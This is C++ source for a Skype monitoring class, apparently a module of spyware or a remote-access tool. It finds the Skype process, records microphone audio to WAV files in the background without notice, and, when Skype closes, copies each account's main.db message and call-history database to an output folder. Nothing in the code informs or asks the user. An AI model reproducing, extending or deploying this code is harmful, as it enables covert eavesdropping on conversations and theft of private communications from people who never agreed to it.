#include "StdAfx.h"
#include "Skype.h"
#include "psapi.h"
#include "until.h"

#pragma comment(lib, "Psapi.lib")


char m_strAppSkypePath[MAX_PATH];	//skype的安装目录

CSkype::CSkype(void)
{
	::ZeroMemory(m_strAppSkypePath, sizeof(m_strAppSkypePath));
	::ZeroMemory(m_strOutPath, sizeof(m_strOutPath));
	::ZeroMemory(m_strRecFileName, sizeof(m_strRecFileName));
	::ZeroMemory(&m_headFile, sizeof(m_headFile));

	m_bInitHead = FALSE;
	m_bRecord = FALSE;
	m_hFileRec = INVALID_HANDLE_VALUE;
	m_hThreadRecding = NULL;
	m_lpAudio = NULL;
	m_hSkypeProcess = NULL;	

	m_hThreadMonitor = NULL;
	m_bWorking = FALSE;
	m_hQuit = ::CreateEvent(NULL, FALSE, FALSE, NULL);
	m_hEventRec = ::CreateEvent(NULL, FALSE, FALSE, NULL);

	InitFileHeader();
}


CSkype::~CSkype(void)
{
	StopWork();

	CloseHandle(m_hQuit);
	CloseHandle(m_hEventRec);
}


BOOL CSkype::CheckSkypeStart()
{
	if (0 == lstrlen(m_strAppSkypePath))
	{
		return FALSE;
	}
	
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	unsigned int i;

	if ( !EnumProcesses( aProcesses, sizeof(aProcesses), &cbNeeded ) )
	{
		return FALSE;
	}

	cProcesses = cbNeeded / sizeof(DWORD);

	BOOL bRet = FALSE;	
	for ( i = 0; i < cProcesses; i++ )
	{
		if( aProcesses[i] == 0 )
		{
			continue;
		}

		bRet = IsPidMatch( aProcesses[i]);
		if (bRet)
		{
			m_hSkypeProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, aProcesses[i]);
			break;
		}
	}

	return bRet;
}

BOOL CSkype::IsPidMatch(DWORD processID)
{
	TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");

	// Get a handle to the process.

	HANDLE hProcess = OpenProcess( PROCESS_QUERY_INFORMATION |
		PROCESS_VM_READ,
		FALSE, processID );

	// Get the process name.
	if (NULL == hProcess)
	{
		return FALSE;
	}


	HMODULE hMod = NULL;
	DWORD cbNeeded = 0;

	if ( EnumProcessModules( hProcess, &hMod, sizeof(hMod), &cbNeeded))
	{
		// 	GetModuleBaseName( hProcess, hMod, szProcessName, sizeof(szProcessName)/sizeof(TCHAR) );

		GetModuleFileNameEx( hProcess, hMod, szProcessName, sizeof(szProcessName)/sizeof(TCHAR) );
	}


	// Print the process name and identifier.

	BOOL bRet = FALSE;
	if (!lstrcmpi(szProcessName, m_strAppSkypePath))
	{
		bRet = TRUE;
	}
	
	CloseHandle( hProcess );

	return bRet;
}


BOOL CSkype::CopyDataBase()
{
	TCHAR  szPath[MAX_PATH] = {0};   
//	GetTempPath(MAX_PATH,   szPath);   
	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0,szPath);
	strcat(szPath, "\\Skype\\");

	return Recurse(szPath);
}



BOOL CSkype::GetPathInReg()
{
	TCHAR szPath[MAX_PATH] = {0};
	BOOL bRet = GetRegValue(HKEY_CURRENT_USER, "Software\\Skype\\Phone", "SkypePath", szPath);

	lstrcpy(m_strAppSkypePath, szPath);

	return bRet;
}


BOOL CSkype::Recurse(LPCTSTR pstr)
{	
	char szFindPath[MAX_PATH] = {0};
	wsprintf(szFindPath, "%s\\*.*", pstr);

	WIN32_FIND_DATA	FindFileData = {0};

	HANDLE hFile = ::FindFirstFile(szFindPath, &FindFileData);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	BOOL bRet = FALSE;
	do 
	{		
		CHAR *pszFileName = FindFileData.cFileName;
		if (strcmp(pszFileName, ".") == 0 || strcmp(pszFileName, "..") == 0)
		{
			continue;
		}

		char szFullPath[MAX_PATH] = {0};
		wsprintf(szFullPath, "%s\\%s", pstr, pszFileName);

		if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			Recurse(szFullPath);
		}

		if (0 == lstrcmpi(pszFileName, "main.db"))
		{
			SYSTEMTIME tmSystem = {0};
			GetSystemTime(&tmSystem);
			char szNewName[MAX_PATH] = {0};
			wsprintf(szNewName, "%s\\main_%04d%02d%02d%02d%02d%02d.db", m_strOutPath, tmSystem.wYear,tmSystem.wMonth, tmSystem.wDay, tmSystem.wHour, tmSystem.wMinute, tmSystem.wSecond);
			MakeSureDirectoryPathExists(m_strOutPath);
			CopyFile(szFullPath, szNewName, FALSE);

			bRet = TRUE;
			//break; //多个skype帐号登陆时全部获取
		}

	} while(FindNextFile(hFile, &FindFileData));	

	return bRet;
}



BOOL CSkype::StartRec()
{	
	//创建录音文件，如果已经存在清空
	SAFE_CLOSEHANDLE(m_hFileRec);

	SYSTEMTIME tmSystem = {0};
	GetLocalTime(&tmSystem);
	wsprintf(m_strRecFileName, "%s\\voice_%04d%02d%02d%02d%02d%02d.wav", m_strOutPath, tmSystem.wYear,tmSystem.wMonth, tmSystem.wDay, tmSystem.wHour, tmSystem.wMinute, tmSystem.wSecond);
	::MakeSureDirectoryPathExists(m_strRecFileName);

	m_hFileRec = ::CreateFile(m_strRecFileName, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == m_hFileRec)
	{
		return FALSE;
	}

	DWORD dwWrite = 0;
	BOOL bRet = WriteFile(m_hFileRec, &m_headFile, sizeof(WAVEFILE_HEADER), &dwWrite, NULL);
	if (!bRet || dwWrite != sizeof(WAVEFILE_HEADER))
	{
		SAFE_CLOSEHANDLE(m_hFileRec);
		return FALSE;
	}

	if (NULL != m_lpAudio)
	{
		delete m_lpAudio;
	}

	m_lpAudio = new CAudio;
	m_hThreadRecding = MyCreateThread(NULL, 0, RecordingEx, this, 0, NULL);
	m_bRecord = TRUE;

	return TRUE;
}


BOOL CSkype::StopRec()
{	
	if (!m_bRecord)
	{
		return FALSE;
	}

	SetEvent(m_hEventRec);
	WaitForSingleObject(m_hThreadRecding, INFINITE);
	CloseHandle(m_hThreadRecding);
	m_hThreadRecding = NULL;

	delete m_lpAudio;
	m_lpAudio = NULL;

	//改写文件头
	::SetFilePointer(m_hFileRec, 0, NULL, FILE_BEGIN);
	int nSizeFile = GetFileSize(m_hFileRec, NULL);
	// 	m_headFile.nSizeFile = m_nSizeWave + sizeof(WAVEFILE_HEADER) - 8;
	m_headFile.nSizeFile = nSizeFile - 8;
	m_headFile.nSizeWave = m_headFile.nSizeFile - sizeof(WAVEFILE_HEADER) + 8;

	DWORD dwWrite = 0;
	::WriteFile(m_hFileRec, &m_headFile, sizeof(m_headFile), &dwWrite, NULL);

	SAFE_CLOSEHANDLE(m_hFileRec);
	m_bRecord = FALSE;

	return TRUE;
}


BOOL CSkype::InitFileHeader()
{
	if (m_bInitHead)
	{
		return TRUE;
	}

	m_headFile.szRiff[0] = 'R';
	m_headFile.szRiff[1] = 'I';
	m_headFile.szRiff[2] = 'F';
	m_headFile.szRiff[3] = 'F';

	m_headFile.szWave[0] = 'W';
	m_headFile.szWave[1] = 'A';
	m_headFile.szWave[2] = 'V';
	m_headFile.szWave[3] = 'E';

	m_headFile.szfmt[0] = 'f';
	m_headFile.szfmt[1] = 'm';
	m_headFile.szfmt[2] = 't';
	m_headFile.szfmt[3] = ' ';

	m_headFile.nSizeFormate = sizeof(GSM610WAVEFORMAT);

	m_headFile.pfm.wfx.wFormatTag = WAVE_FORMAT_GSM610;
	m_headFile.pfm.wfx.nChannels = 1;
	m_headFile.pfm.wfx.nSamplesPerSec = 8000;
	m_headFile.pfm.wfx.nAvgBytesPerSec = 1625;
	m_headFile.pfm.wfx.nBlockAlign = 65;
	m_headFile.pfm.wfx.wBitsPerSample = 0;
	m_headFile.pfm.wfx.cbSize = 2;
	m_headFile.pfm.wSamplesPerBlock = 320;	


	m_headFile.szData[0] = 'd';
	m_headFile.szData[1] = 'a';
	m_headFile.szData[2] = 't';
	m_headFile.szData[3] = 'a';

	m_bInitHead = TRUE;

	return TRUE;
}


DWORD WINAPI CSkype::WorkThreadEx(LPVOID lpThis)
{
	if (NULL != lpThis)
	{
		return ((CSkype *)lpThis)->WorkThread();
	}

	return 0;
}


DWORD CSkype::WorkThread()
{
	while (TRUE)
	{
		if (WAIT_OBJECT_0 == ::WaitForSingleObject(m_hQuit, 10000))
		{
			break;
		}

		if (NULL == m_hSkypeProcess)
		{
			if (!CheckSkypeStart())
			{
				continue;
			}
		}		

		if (!m_bRecord)
		{
			m_bRecord = StartRec();
		}

		if (m_bRecord)
		{
			CheckFileSize();
		}

		if (NULL != m_hSkypeProcess && WAIT_OBJECT_0 == ::WaitForSingleObject(m_hSkypeProcess, 0))
		{
			if (m_bRecord)
			{
				StopRec();
				CopyDataBase();
			}

			CloseHandle(m_hSkypeProcess);
			m_hSkypeProcess = NULL;
		}
		
	}

	return 0;
}


BOOL CSkype::CheckFileSize()
{
	if (INVALID_HANDLE_VALUE == m_hFileRec)
	{
		return FALSE;		
	}

	BOOL bRet = FALSE;
	DWORD dwLow = GetFileSize(m_hFileRec, NULL);
	if (dwLow > 1024*1024*5)
	{
		bRet = StopRec();
		bRet &= StartRec();
	}

	return bRet;
}


DWORD WINAPI CSkype::RecordingEx(LPVOID lpThis)
{
	if (NULL != lpThis)
	{
		return ((CSkype *)lpThis)->Recording();
	}

	return 0;
}


DWORD CSkype::Recording()
{
	while (TRUE)
	{
		if (WAIT_OBJECT_0 == WaitForSingleObject(m_hEventRec, 0))
		{
			break;
		}

		DWORD dwBytes = 0;
		LPBYTE lpBuffer = m_lpAudio->getRecordBuffer(&dwBytes);
		if (lpBuffer == NULL)
		{
			continue;
		}

		DWORD dwWrite = 0;
		::WriteFile(m_hFileRec, lpBuffer, dwBytes, &dwWrite, NULL);
	}

	return 0;
}

BOOL CSkype::SetOutputDir(LPCTSTR strOutPath)
{
	lstrcpy(m_strOutPath, strOutPath); 
	::MakeSureDirectoryPathExists(m_strOutPath);

	return TRUE;
}


BOOL CSkype::StartWork()
{
	//检测skype是否已经安装
	if (0 == lstrlen(m_strAppSkypePath))
	{
		if (!GetPathInReg())//没有安装过skype
		{
			return FALSE;
		}
	}

	if (m_bWorking)
	{
		return TRUE;
	}

	::ResetEvent(m_hQuit);
	::ResetEvent(m_hEventRec);	

	m_hThreadMonitor = MyCreateThread(NULL, 0, WorkThreadEx, this, 0, NULL);
	m_bWorking = TRUE;

	return TRUE;
}


BOOL CSkype::StopWork()
{
	if (!m_bWorking)
	{
		return TRUE;
	}

	StopRec();

	::SetEvent(m_hQuit);
	WaitForSingleObject(m_hThreadMonitor, INFINITE);
	CloseHandle(m_hThreadMonitor);

	m_bWorking = FALSE;

	return TRUE;
}